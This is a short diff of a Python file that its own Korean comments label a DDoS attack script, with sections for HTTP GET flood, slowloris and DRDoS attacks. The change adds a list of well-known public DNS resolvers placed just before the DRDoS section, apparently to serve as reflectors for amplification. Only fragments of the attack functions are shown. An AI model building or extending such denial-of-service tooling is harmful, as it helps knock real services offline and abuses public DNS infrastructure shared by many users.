@@ -64,6 +64,20 @@ user_agents = [
     "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
 ]
 
+# dns 서버 목록
+dns_servers = [
+    "8.8.8.8",      # Google Public DNS
+    "8.8.4.4",      # Google Public DNS
+    "1.1.1.1",      # Cloudflare DNS
+    "1.0.0.1",      # Cloudflare DNS Secondary
+    "9.9.9.9",      # Quad9 DNS
+    "149.112.112.112",  # Quad9 DNS Secondary
+    "208.67.222.222",   # OpenDNS
+    "208.67.220.220",   # OpenDNS Secondary
+    "4.2.2.1",      # Level 3 (CenturyLink) DNS
+    "4.2.2.2",      # Level 3 (CenturyLink) DNS Secondary
+]
+
 
 """DDos 공격 스크립트"""
 # HTTP GET Flood 공격 함수
@@ -165,6 +179,7 @@ def slowloris(host, port, thread_id):
             time.sleep(15)
     except Exception as e:
         console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
+
 
 
 """DRDos 공격 스크립트"""
